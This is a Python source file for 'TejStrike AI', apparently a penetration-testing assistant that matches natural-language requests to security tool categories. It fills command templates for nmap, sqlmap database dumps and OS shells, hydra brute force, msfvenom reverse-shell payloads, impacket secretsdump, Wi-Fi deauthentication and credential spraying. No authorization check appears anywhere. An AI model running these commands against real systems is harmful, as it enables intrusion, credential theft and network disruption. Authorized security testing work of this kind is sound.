"""
TejStrike AI - Core AI Engine
Handles natural language understanding, tool selection, command generation,
and intelligent output parsing for security operations.
Works alongside LLM providers for enhanced natural language interpretation.
"""

import json
import re
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass, field
from enum import Enum


class TaskCategory(Enum):
    """Categories of security tasks Tej can handle."""
    RECONNAISSANCE = "reconnaissance"
    SCANNING = "scanning"
    ENUMERATION = "enumeration"
    VULNERABILITY_ANALYSIS = "vulnerability_analysis"
    EXPLOITATION = "exploitation"
    POST_EXPLOITATION = "post_exploitation"
    PASSWORD_ATTACKS = "password_attacks"
    WIRELESS = "wireless"
    WEB_APPLICATION = "web_application"
    SNIFFING_SPOOFING = "sniffing_spoofing"
    FORENSICS = "forensics"
    REVERSE_ENGINEERING = "reverse_engineering"
    SOCIAL_ENGINEERING = "social_engineering"
    REPORTING = "reporting"
    CRYPTO = "crypto"
    HARDWARE = "hardware"
    CUSTOM = "custom"


@dataclass
class TaskIntent:
    """Parsed user intent from natural language input."""
    category: TaskCategory
    action: str
    target: Optional[str] = None
    parameters: Dict[str, Any] = field(default_factory=dict)
    tools_suggested: List[str] = field(default_factory=list)
    confidence: float = 0.0
    raw_input: str = ""


@dataclass
class ToolResult:
    """Result from a tool execution."""
    tool_name: str
    command: str
    exit_code: int
    stdout: str
    stderr: str
    parsed_data: Dict[str, Any] = field(default_factory=dict)
    summary: str = ""
    duration: float = 0.0


class TejBrain:
    """
    Core AI brain for Tej - handles intent recognition, tool selection,
    command building, and output analysis.
    """

    # Keyword-to-category mapping for intent recognition
    INTENT_PATTERNS = {
        TaskCategory.RECONNAISSANCE: {
            "keywords": [
                "recon", "reconnaissance", "discover", "find", "lookup", "whois",
                "dns", "subdomain", "domain", "osint", "footprint", "gather info",
                "information gathering", "theHarvester", "maltego", "shodan",
                "google dork", "dork", "spiderfoot", "recon-ng"
            ],
            "tools": ["whois", "dig", "nslookup", "host", "theHarvester", 
                      "recon-ng", "maltego", "spiderfoot", "fierce", "dnsenum",
                      "dnsrecon", "sublist3r", "amass", "shodan"]
        },
        TaskCategory.SCANNING: {
            "keywords": [
                "scan", "port scan", "nmap", "network scan", "ping sweep",
                "service detection", "os detection", "host discovery",
                "masscan", "unicornscan", "rustscan"
            ],
            "tools": ["nmap", "masscan", "unicornscan", "rustscan", "zmap",
                      "hping3", "netdiscover", "arp-scan", "nbtscan"]
        },
        TaskCategory.ENUMERATION: {
            "keywords": [
                "enumerate", "enumeration", "smb", "snmp", "ldap", "shares",
                "users", "enum4linux", "smbclient", "rpcclient", "netstat"
            ],
            "tools": ["enum4linux", "smbclient", "rpcclient", "snmpwalk",
                      "ldapsearch", "nbtscan", "onesixtyone", "smtp-user-enum",
                      "finger", "rpcinfo"]
        },
        TaskCategory.VULNERABILITY_ANALYSIS: {
            "keywords": [
                "vulnerability", "vuln", "cve", "exploit search", "nikto",
                "openvas", "nessus", "vulnerability scan", "audit", "assess"
            ],
            "tools": ["nikto", "openvas", "nessus", "wpscan", "joomscan",
                      "searchsploit", "vulners", "lynis", "unix-privesc-check"]
        },
        TaskCategory.EXPLOITATION: {
            "keywords": [
                "exploit", "metasploit", "msfconsole", "payload", "shell",
                "reverse shell", "bind shell", "buffer overflow", "msfvenom",
                "attack", "pwn", "compromise", "hack"
            ],
            "tools": ["metasploit", "msfconsole", "msfvenom", "searchsploit",
                      "exploitdb", "beef-xss", "set", "commix"]
        },
        TaskCategory.POST_EXPLOITATION: {
            "keywords": [
                "post exploit", "privilege escalation", "privesc", "persistence",
                "lateral movement", "pivot", "mimikatz", "meterpreter",
                "bloodhound", "linpeas", "winpeas"
            ],
            "tools": ["meterpreter", "mimikatz", "bloodhound", "powersploit",
                      "empire", "linpeas", "winpeas", "pspy", "chisel",
                      "ligolo", "proxychains"]
        },
        TaskCategory.PASSWORD_ATTACKS: {
            "keywords": [
                "password", "crack", "brute force", "hash", "john", "hashcat",
                "hydra", "wordlist", "dictionary attack", "rainbow table",
                "credential", "login", "medusa", "patator"
            ],
            "tools": ["john", "hashcat", "hydra", "medusa", "ncrack",
                      "patator", "cewl", "crunch", "ophcrack", "rainbowcrack",
                      "hash-identifier", "hashid"]
        },
        TaskCategory.WIRELESS: {
            "keywords": [
                "wifi", "wireless", "wpa", "wep", "aircrack", "deauth",
                "handshake", "monitor mode", "packet injection", "bluetooth",
                "airmon", "airodump", "aireplay", "wifite"
            ],
            "tools": ["aircrack-ng", "airmon-ng", "airodump-ng", "aireplay-ng",
                      "wifite", "bettercap", "reaver", "pixiewps", "fern-wifi-cracker",
                      "kismet", "bully", "fluxion"]
        },
        TaskCategory.WEB_APPLICATION: {
            "keywords": [
                "web", "http", "sql injection", "sqli", "xss", "csrf", "lfi",
                "rfi", "directory traversal", "burp", "zap", "gobuster",
                "dirb", "dirbuster", "ffuf", "wfuzz", "sqlmap", "website"
            ],
            "tools": ["sqlmap", "burpsuite", "zaproxy", "gobuster", "dirb",
                      "dirbuster", "ffuf", "wfuzz", "nikto", "whatweb",
                      "wafw00f", "commix", "xsser", "dalfox", "nuclei",
                      "httpx", "feroxbuster"]
        },
        TaskCategory.SNIFFING_SPOOFING: {
            "keywords": [
                "sniff", "spoof", "mitm", "man in the middle", "arp spoof",
                "dns spoof", "packet capture", "wireshark", "tcpdump",
                "ettercap", "bettercap", "responder"
            ],
            "tools": ["wireshark", "tcpdump", "ettercap", "bettercap",
                      "arpspoof", "dnsspoof", "responder", "mitmproxy",
                      "sslstrip", "macchanger"]
        },
        TaskCategory.FORENSICS: {
            "keywords": [
                "forensic", "analyze", "evidence", "disk image", "memory dump",
                "autopsy", "volatility", "binwalk", "foremost", "steghide",
                "exiftool", "strings", "file recovery"
            ],
            "tools": ["autopsy", "volatility", "binwalk", "foremost",
                      "steghide", "exiftool", "bulk_extractor", "scalpel",
                      "strings", "xxd", "hexdump", "sleuthkit"]
        },
        TaskCategory.REVERSE_ENGINEERING: {
            "keywords": [
                "reverse engineer", "disassemble", "decompile", "binary",
                "malware analysis", "ghidra", "radare2", "gdb", "ida",
                "debug", "assembly", "elf", "pe"
            ],
            "tools": ["ghidra", "radare2", "r2", "gdb", "objdump", "ltrace",
                      "strace", "file", "readelf", "nm", "strings",
                      "upx", "jadx", "apktool"]
        },
        TaskCategory.SOCIAL_ENGINEERING: {
            "keywords": [
                "social engineer", "phishing", "spear phishing", "pretexting",
                "set toolkit", "gophish", "evilginx", "king phisher"
            ],
            "tools": ["setoolkit", "gophish", "evilginx2", "king-phisher",
                      "beef-xss", "blackeye"]
        },
        TaskCategory.REPORTING: {
            "keywords": [
                "report", "document", "export", "save results", "log",
                "generate report", "summary", "findings"
            ],
            "tools": ["pipal", "cutycapt", "faraday", "dradis", "magictree"]
        },
        TaskCategory.CRYPTO: {
            "keywords": [
                "encrypt", "decrypt", "cipher", "encode", "decode", "base64",
                "hash", "gpg", "openssl", "crypto"
            ],
            "tools": ["openssl", "gpg", "hashcat", "john", "hash-identifier",
                      "rsatool", "xortool"]
        }
    }

    # Common tool command templates
    TOOL_TEMPLATES = {
        "nmap": {
            "quick_scan": "nmap -sV {target}",
            "full_scan": "nmap -sC -sV -O -A -p- {target}",
            "stealth_scan": "nmap -sS -sV -T2 {target}",
            "udp_scan": "nmap -sU --top-ports 100 {target}",
            "vuln_scan": "nmap --script vuln {target}",
            "ping_sweep": "nmap -sn {target}",
            "os_detect": "nmap -O {target}",
            "service_version": "nmap -sV --version-intensity 5 {target}",
            "script_scan": "nmap -sC {target}",
            "aggressive": "nmap -A -T4 {target}",
            "firewall_evasion": "nmap -f --mtu 24 -T2 {target}",
            "top_ports": "nmap --top-ports {count} {target}"
        },
        "sqlmap": {
            "basic": "sqlmap -u \"{target}\"",
            "forms": "sqlmap -u \"{target}\" --forms",
            "dump_all": "sqlmap -u \"{target}\" --dump-all",
            "dump_db": "sqlmap -u \"{target}\" -D {database} --dump",
            "os_shell": "sqlmap -u \"{target}\" --os-shell",
            "batch": "sqlmap -u \"{target}\" --batch --level=5 --risk=3"
        },
        "hydra": {
            "ssh": "hydra -l {username} -P {wordlist} ssh://{target}",
            "ftp": "hydra -l {username} -P {wordlist} ftp://{target}",
            "http_post": "hydra -l {username} -P {wordlist} {target} http-post-form \"{form}\"",
            "rdp": "hydra -l {username} -P {wordlist} rdp://{target}",
            "smb": "hydra -l {username} -P {wordlist} smb://{target}",
            "userlist": "hydra -L {userlist} -P {wordlist} {target} {service}"
        },
        "john": {
            "basic": "john {hashfile}",
            "wordlist": "john --wordlist={wordlist} {hashfile}",
            "rules": "john --wordlist={wordlist} --rules {hashfile}",
            "format": "john --format={format} {hashfile}",
            "show": "john --show {hashfile}"
        },
        "hashcat": {
            "basic": "hashcat -m {mode} {hashfile} {wordlist}",
            "brute": "hashcat -m {mode} -a 3 {hashfile} {mask}",
            "rules": "hashcat -m {mode} -r {rules} {hashfile} {wordlist}",
            "show": "hashcat -m {mode} {hashfile} --show"
        },
        "gobuster": {
            "dir": "gobuster dir -u {target} -w {wordlist}",
            "dns": "gobuster dns -d {target} -w {wordlist}",
            "vhost": "gobuster vhost -u {target} -w {wordlist}",
            "fuzz": "gobuster fuzz -u {target} -w {wordlist}"
        },
        "ffuf": {
            "dir": "ffuf -u {target}/FUZZ -w {wordlist}",
            "subdomain": "ffuf -u http://FUZZ.{target} -w {wordlist}",
            "parameter": "ffuf -u {target}?FUZZ=test -w {wordlist}",
            "post": "ffuf -u {target} -X POST -d \"FUZZ\" -w {wordlist}"
        },
        "nikto": {
            "basic": "nikto -h {target}",
            "full": "nikto -h {target} -C all",
            "ssl": "nikto -h {target} -ssl"
        },
        "metasploit": {
            "search": "msfconsole -q -x \"search {query}; exit\"",
            "exploit": "msfconsole -q -x \"use {module}; set RHOSTS {target}; {options}; exploit; exit\"",
            "payload": "msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f {format} -o {output}"
        },
        "aircrack-ng": {
            "monitor": "airmon-ng start {interface}",
            "scan": "airodump-ng {interface}",
            "capture": "airodump-ng -c {channel} --bssid {bssid} -w {output} {interface}",
            "deauth": "aireplay-ng --deauth {count} -a {bssid} {interface}",
            "crack": "aircrack-ng -w {wordlist} {capture}"
        },
        "wireshark": {
            "capture": "tshark -i {interface} -w {output}",
            "read": "tshark -r {file}",
            "filter": "tshark -r {file} -Y \"{filter}\"",
            "stats": "tshark -r {file} -q -z io,stat,1"
        },
        "burpsuite": {
            "start": "burpsuite",
            "crawl": "Use Burp Suite Spider on {target}"
        },
        "enum4linux": {
            "basic": "enum4linux {target}",
            "all": "enum4linux -a {target}",
            "users": "enum4linux -U {target}",
            "shares": "enum4linux -S {target}"
        },
        "wpscan": {
            "basic": "wpscan --url {target}",
            "enumerate": "wpscan --url {target} -e ap,at,u",
            "brute": "wpscan --url {target} -U {username} -P {wordlist}"
        },
        "responder": {
            "basic": "responder -I {interface}",
            "analyze": "responder -I {interface} -A",
            "wpad": "responder -I {interface} -wFb"
        },
        "crackmapexec": {
            "smb": "crackmapexec smb {target}",
            "smb_auth": "crackmapexec smb {target} -u {username} -p {password}",
            "winrm": "crackmapexec winrm {target} -u {username} -p {password}",
            "shares": "crackmapexec smb {target} -u {username} -p {password} --shares"
        },
        "impacket": {
            "psexec": "impacket-psexec {domain}/{username}:{password}@{target}",
            "smbexec": "impacket-smbexec {domain}/{username}:{password}@{target}",
            "wmiexec": "impacket-wmiexec {domain}/{username}:{password}@{target}",
            "secretsdump": "impacket-secretsdump {domain}/{username}:{password}@{target}",
            "getnpusers": "impacket-GetNPUsers {domain}/ -usersfile {userlist} -no-pass"
        },
        "searchsploit": {
            "search": "searchsploit {query}",
            "examine": "searchsploit -x {id}",
            "mirror": "searchsploit -m {id}"
        },
        "binwalk": {
            "scan": "binwalk {file}",
            "extract": "binwalk -e {file}",
            "entropy": "binwalk -E {file}"
        },
        "steghide": {
            "extract": "steghide extract -sf {file}",
            "embed": "steghide embed -cf {cover} -ef {secret}",
            "info": "steghide info {file}"
        },
        "volatility": {
            "info": "volatility -f {file} imageinfo",
            "pslist": "volatility -f {file} --profile={profile} pslist",
            "netscan": "volatility -f {file} --profile={profile} netscan",
            "hashdump": "volatility -f {file} --profile={profile} hashdump"
        },
        "theHarvester": {
            "basic": "theHarvester -d {target} -b all",
            "specific": "theHarvester -d {target} -b {source} -l {limit}"
        },
        "amass": {
            "enum": "amass enum -d {target}",
            "passive": "amass enum -passive -d {target}",
            "active": "amass enum -active -d {target}"
        },
        "whatweb": {
            "basic": "whatweb {target}",
            "aggressive": "whatweb -a 3 {target}",
            "verbose": "whatweb -v {target}"
        },
        "wafw00f": {
            "basic": "wafw00f {target}",
            "all": "wafw00f -a {target}"
        },
        "nuclei": {
            "basic": "nuclei -u {target}",
            "templates": "nuclei -u {target} -t {templates}",
            "severity": "nuclei -u {target} -severity {severity}"
        }
    }

    def __init__(self):
        """Initialize the TejStrike AI Brain."""
        self.context: Dict[str, Any] = {}
        self.history: List[Dict[str, Any]] = []
        self.session_targets: List[str] = []

    def parse_intent(self, user_input: str) -> TaskIntent:
        """
        Parse natural language input to determine the user's intent.
        Returns a TaskIntent with category, action, target, and suggested tools.
        """
        input_lower = user_input.lower().strip()
        best_category = TaskCategory.CUSTOM
        best_score = 0
        matched_tools = []

        # Score each category based on keyword matches
        for category, info in self.INTENT_PATTERNS.items():
            score = 0
            cat_tools = []
            for keyword in info["keywords"]:
                if keyword in input_lower:
                    score += len(keyword.split())  # Multi-word matches score higher
                    # Find related tools
                    for tool in info["tools"]:
                        if tool.lower() in input_lower:
                            score += 3  # Explicit tool mention = high confidence
                            cat_tools.append(tool)
            if score > best_score:
                best_score = score
                best_category = category
                matched_tools = cat_tools if cat_tools else info["tools"][:3]

        # Extract target (IP, domain, URL)
        target = self._extract_target(input_lower)

        # Extract action verb
        action = self._extract_action(input_lower)

        # Extract parameters
        parameters = self._extract_parameters(input_lower)

        # Calculate confidence
        confidence = min(best_score / 10.0, 1.0) if best_score > 0 else 0.1

        return TaskIntent(
            category=best_category,
            action=action,
            target=target,
            parameters=parameters,
            tools_suggested=matched_tools,
            confidence=confidence,
            raw_input=user_input
        )

    def _extract_target(self, text: str) -> Optional[str]:
        """Extract target IP, domain, or URL from text."""
        # URL pattern
        url_match = re.search(
            r'https?://[^\s<>"{}|\\^`\[\]]+', text
        )
        if url_match:
            return url_match.group(0)

        # IP address pattern
        ip_match = re.search(
            r'\b(?:\d{1,3}\.){3}\d{1,3}(?:/\d{1,2})?\b', text
        )
        if ip_match:
            return ip_match.group(0)

        # Domain pattern
        domain_match = re.search(
            r'\b(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}\b',
            text
        )
        if domain_match:
            candidate = domain_match.group(0)
            # Filter out common non-target words
            if candidate not in ["e.g.", "i.e.", "etc."]:
                return candidate

        return None

    def _extract_action(self, text: str) -> str:
        """Extract the primary action verb from text."""
        action_verbs = [
            "scan", "attack", "exploit", "crack", "enumerate", "discover",
            "sniff", "spoof", "capture", "analyze", "dump", "extract",
            "brute force", "fuzz", "crawl", "intercept", "decrypt", "encrypt",
            "deauth", "inject", "pivot", "escalate", "bypass", "reverse",
            "decompile", "disassemble", "recover", "identify", "detect",
            "monitor", "search", "find", "list", "show", "help", "start",
            "stop", "configure", "setup"
        ]
        for verb in sorted(action_verbs, key=len, reverse=True):
            if verb in text:
                return verb
        return "analyze"

    def _extract_parameters(self, text: str) -> Dict[str, Any]:
        """Extract common parameters from text."""
        params = {}

        # Port numbers
        port_match = re.search(r'port[s]?\s+(\d+(?:[,-]\d+)*)', text)
        if port_match:
            params["ports"] = port_match.group(1)

        # Wordlist
        wordlist_match = re.search(r'(?:wordlist|dictionary)\s+(\S+)', text)
        if wordlist_match:
            params["wordlist"] = wordlist_match.group(1)
        elif "rockyou" in text:
            params["wordlist"] = "/usr/share/wordlists/rockyou.txt"

        # Username
        user_match = re.search(r'(?:user(?:name)?|login)\s+(\S+)', text)
        if user_match:
            params["username"] = user_match.group(1)

        # Interface
        iface_match = re.search(r'(?:interface|iface|adapter)\s+(\S+)', text)
        if iface_match:
            params["interface"] = iface_match.group(1)

        # Output file
        output_match = re.search(r'(?:output|save|write)\s+(?:to\s+)?(\S+)', text)
        if output_match:
            params["output"] = output_match.group(1)

        # Threads
        thread_match = re.search(r'(\d+)\s*threads?', text)
        if thread_match:
            params["threads"] = int(thread_match.group(1))

        # Timeout
        timeout_match = re.search(r'timeout\s+(\d+)', text)
        if timeout_match:
            params["timeout"] = int(timeout_match.group(1))

        return params

    def build_command(self, intent: TaskIntent) -> List[Dict[str, str]]:
        """
        Build executable commands based on the parsed intent.
        Returns a list of {tool, variant, command} dicts.
        """
        commands = []

        for tool in intent.tools_suggested:
            if tool in self.TOOL_TEMPLATES:
                templates = self.TOOL_TEMPLATES[tool]
                # Select best template variant based on action/params
                variant = self._select_variant(tool, templates, intent)
                cmd_template = templates[variant]
                cmd = self._fill_template(cmd_template, intent)
                commands.append({
                    "tool": tool,
                    "variant": variant,
                    "command": cmd,
                    "description": f"{tool} {variant.replace('_', ' ')}"
                })

        # If no templates matched, try building a raw command
        if not commands and intent.tools_suggested:
            tool = intent.tools_suggested[0]
            target_str = intent.target or "{target}"
            commands.append({
                "tool": tool,
                "variant": "auto",
                "command": f"{tool} {target_str}",
                "description": f"Run {tool} against target"
            })

        return commands

    def _select_variant(self, tool: str, templates: Dict[str, str],
                        intent: TaskIntent) -> str:
        """Select the best command variant for the given intent."""
        action = intent.action
        params = intent.parameters

        # Map actions to preferred variants
        action_map = {
            "scan": ["full_scan", "basic", "scan", "aggressive"],
            "quick": ["quick_scan", "basic"],
            "exploit": ["exploit", "basic"],
            "crack": ["wordlist", "basic", "crack"],
            "enumerate": ["all", "enumerate", "basic"],
            "discover": ["enum", "passive", "basic"],
            "brute force": ["brute", "userlist", "basic"],
            "fuzz": ["fuzz", "dir", "basic"],
            "capture": ["capture", "scan"],
            "extract": ["extract", "scan"],
            "dump": ["dump_all", "dump_db", "secretsdump"],
            "search": ["search", "basic"],
            "analyze": ["info", "basic", "scan"],
            "monitor": ["monitor", "basic", "capture"],
        }

        # Try to find matching variant from action
        if action in action_map:
            for preferred in action_map[action]:
                if preferred in templates:
                    return preferred

        # Default to 'basic' or first available
        if "basic" in templates:
            return "basic"
        return list(templates.keys())[0]

    def _fill_template(self, template: str, intent: TaskIntent) -> str:
        """Fill in a command template with available values."""
        replacements = {
            "{target}": intent.target or "<TARGET>",
            "{wordlist}": intent.parameters.get("wordlist", "/usr/share/wordlists/rockyou.txt"),
            "{username}": intent.parameters.get("username", "<USERNAME>"),
            "{password}": intent.parameters.get("password", "<PASSWORD>"),
            "{interface}": intent.parameters.get("interface", "<INTERFACE>"),
            "{output}": intent.parameters.get("output", "tej_output"),
            "{file}": intent.parameters.get("file", "<FILE>"),
            "{hashfile}": intent.parameters.get("hashfile", "<HASHFILE>"),
            "{format}": intent.parameters.get("format", "raw"),
            "{mode}": intent.parameters.get("mode", "0"),
            "{mask}": intent.parameters.get("mask", "?a?a?a?a?a?a"),
            "{rules}": intent.parameters.get("rules", "/usr/share/hashcat/rules/best64.rule"),
            "{domain}": intent.parameters.get("domain", "."),
            "{lhost}": intent.parameters.get("lhost", "<LHOST>"),
            "{lport}": intent.parameters.get("lport", "4444"),
            "{module}": intent.parameters.get("module", "<MODULE>"),
            "{payload}": intent.parameters.get("payload", "windows/meterpreter/reverse_tcp"),
            "{query}": intent.parameters.get("query", intent.action),
            "{bssid}": intent.parameters.get("bssid", "<BSSID>"),
            "{channel}": intent.parameters.get("channel", "<CHANNEL>"),
            "{count}": str(intent.parameters.get("count", "10")),
            "{capture}": intent.parameters.get("capture", "<CAPTURE_FILE>"),
            "{filter}": intent.parameters.get("filter", ""),
            "{id}": intent.parameters.get("id", "<EXPLOIT_ID>"),
            "{profile}": intent.parameters.get("profile", "<PROFILE>"),
            "{source}": intent.parameters.get("source", "all"),
            "{limit}": str(intent.parameters.get("limit", "500")),
            "{cover}": intent.parameters.get("cover", "<COVER_FILE>"),
            "{secret}": intent.parameters.get("secret", "<SECRET_FILE>"),
            "{templates}": intent.parameters.get("templates", "cves/"),
            "{severity}": intent.parameters.get("severity", "critical,high"),
            "{form}": intent.parameters.get("form", "<FORM_PATH>:<PARAMS>:F=<FAIL_MSG>"),
            "{userlist}": intent.parameters.get("userlist", "<USERLIST>"),
            "{service}": intent.parameters.get("service", "ssh"),
            "{database}": intent.parameters.get("database", "<DATABASE>"),
            "{options}": intent.parameters.get("options", ""),
        }

        result = template
        for placeholder, value in replacements.items():
            result = result.replace(placeholder, value)
        return result

    def analyze_output(self, result: ToolResult) -> Dict[str, Any]:
        """
        Analyze tool output and extract structured intelligence.
        """
        analysis = {
            "status": "success" if result.exit_code == 0 else "error",
            "tool": result.tool_name,
            "findings": [],
            "recommendations": [],
            "severity": "info",
            "raw_length": len(result.stdout)
        }

        output = result.stdout.lower()

        # Detect open ports (nmap-style)
        port_pattern = re.findall(
            r'(\d+)/(?:tcp|udp)\s+(open|closed|filtered)\s+(\S+)',
            result.stdout, re.IGNORECASE
        )
        if port_pattern:
            for port, state, service in port_pattern:
                analysis["findings"].append({
                    "type": "port",
                    "port": int(port),
                    "state": state,
                    "service": service
                })

        # Detect vulnerabilities
        vuln_keywords = ["vulnerable", "vulnerability", "cve-", "exploit", "critical", "high risk"]
        for keyword in vuln_keywords:
            if keyword in output:
                analysis["severity"] = "high"
                analysis["recommendations"].append(
                    f"Potential vulnerability detected (keyword: {keyword}). Investigate further."
                )

        # Detect credentials
        cred_patterns = [
            r'(?:username|user|login)[\s:=]+(\S+)',
            r'(?:password|pass|pwd)[\s:=]+(\S+)',
        ]
        for pattern in cred_patterns:
            matches = re.findall(pattern, result.stdout, re.IGNORECASE)
            if matches:
                analysis["findings"].append({
                    "type": "credential_reference",
                    "count": len(matches)
                })

        # Detect hosts
        host_pattern = re.findall(
            r'(?:Host|Nmap scan report for)\s+(\S+)\s+.*?(?:is up|Up)',
            result.stdout, re.IGNORECASE
        )
        if host_pattern:
            analysis["findings"].append({
                "type": "hosts_discovered",
                "hosts": host_pattern
            })

        # Count lines of output
        lines = result.stdout.strip().split('\n')
        analysis["output_lines"] = len(lines)

        return analysis

    def suggest_next_steps(self, intent: TaskIntent, 
                           results: List[ToolResult]) -> List[str]:
        """
        Based on results, suggest intelligent next steps.
        """
        suggestions = []

        if not results:
            return ["Run the suggested commands first."]

        for result in results:
            analysis = self.analyze_output(result)

            # If ports found, suggest enumeration
            ports = [f for f in analysis["findings"] if f.get("type") == "port"]
            if ports:
                for port_info in ports:
                    port = port_info["port"]
                    service = port_info.get("service", "")
                    if port == 80 or port == 443 or "http" in service:
                        suggestions.append(f"Run nikto/gobuster against web service on port {port}")
                        suggestions.append(f"Run whatweb to fingerprint the web application")
                    if port == 22 or "ssh" in service:
                        suggestions.append(f"Try SSH brute force with hydra on port {port}")
                    if port == 21 or "ftp" in service:
                        suggestions.append(f"Check for anonymous FTP login on port {port}")
                    if port == 445 or port == 139 or "smb" in service:
                        suggestions.append(f"Run enum4linux for SMB enumeration")
                        suggestions.append(f"Try crackmapexec against SMB")
                    if port == 3389 or "rdp" in service:
                        suggestions.append(f"Try RDP brute force with hydra")
                    if port == 3306 or "mysql" in service:
                        suggestions.append(f"Try MySQL enumeration")
                    if port == 1433 or "mssql" in service:
                        suggestions.append(f"Try MSSQL enumeration with impacket")

            # If vulnerabilities found, suggest exploitation
            if analysis["severity"] in ["high", "critical"]:
                suggestions.append("Search for exploits using searchsploit")
                suggestions.append("Check Metasploit for matching modules")

            # If credentials found, suggest reuse
            cred_findings = [f for f in analysis["findings"] 
                           if f.get("type") == "credential_reference"]
            if cred_findings:
                suggestions.append("Try credential reuse across discovered services")
                suggestions.append("Use crackmapexec for credential spraying")

        if not suggestions:
            suggestions.append("Review output for actionable intelligence")
            suggestions.append("Try deeper enumeration of discovered services")

        return list(dict.fromkeys(suggestions))  # Remove duplicates

    def get_tool_help(self, tool_name: str) -> Dict[str, Any]:
        """Get help information for a specific tool."""
        help_info = {
            "name": tool_name,
            "available_variants": [],
            "category": None,
            "description": ""
        }

        if tool_name in self.TOOL_TEMPLATES:
            help_info["available_variants"] = list(self.TOOL_TEMPLATES[tool_name].keys())
            for cat, info in self.INTENT_PATTERNS.items():
                if tool_name in info["tools"]:
                    help_info["category"] = cat.value
                    break

        tool_descriptions = {
            "nmap": "Network exploration and security auditing tool",
            "sqlmap": "Automatic SQL injection and database takeover tool",
            "hydra": "Fast network logon cracker / brute forcer",
            "john": "John the Ripper password cracker",
            "hashcat": "Advanced password recovery tool (GPU-accelerated)",
            "gobuster": "Directory/file & DNS busting tool",
            "ffuf": "Fast web fuzzer",
            "nikto": "Web server scanner",
            "metasploit": "Penetration testing framework",
            "aircrack-ng": "Wireless network security suite",
            "wireshark": "Network protocol analyzer",
            "burpsuite": "Web application security testing platform",
            "enum4linux": "Windows/Samba enumeration tool",
            "wpscan": "WordPress security scanner",
            "responder": "LLMNR/NBT-NS/MDNS poisoner",
            "crackmapexec": "Network information gathering and execution tool",
            "impacket": "Collection of Python classes for network protocols",
            "searchsploit": "Exploit Database search tool",
            "binwalk": "Firmware analysis tool",
            "steghide": "Steganography tool",
            "volatility": "Memory forensics framework",
            "theHarvester": "Email, subdomain, and name harvester",
            "amass": "Attack surface mapping tool",
            "whatweb": "Web application fingerprinting tool",
            "wafw00f": "Web Application Firewall detection tool",
            "nuclei": "Vulnerability scanner based on templates",
            "ghidra": "Software reverse engineering framework",
            "radare2": "Reverse engineering framework",
            "setoolkit": "Social Engineering Toolkit",
            "bettercap": "Network attack and monitoring framework",
            "msfvenom": "Metasploit payload generator",
        }

        help_info["description"] = tool_descriptions.get(
            tool_name, f"Security tool: {tool_name}"
        )
        return help_info

    def get_all_categories(self) -> Dict[str, List[str]]:
        """Get all tool categories and their tools."""
        return {
            cat.value: info["tools"]
            for cat, info in self.INTENT_PATTERNS.items()
        }
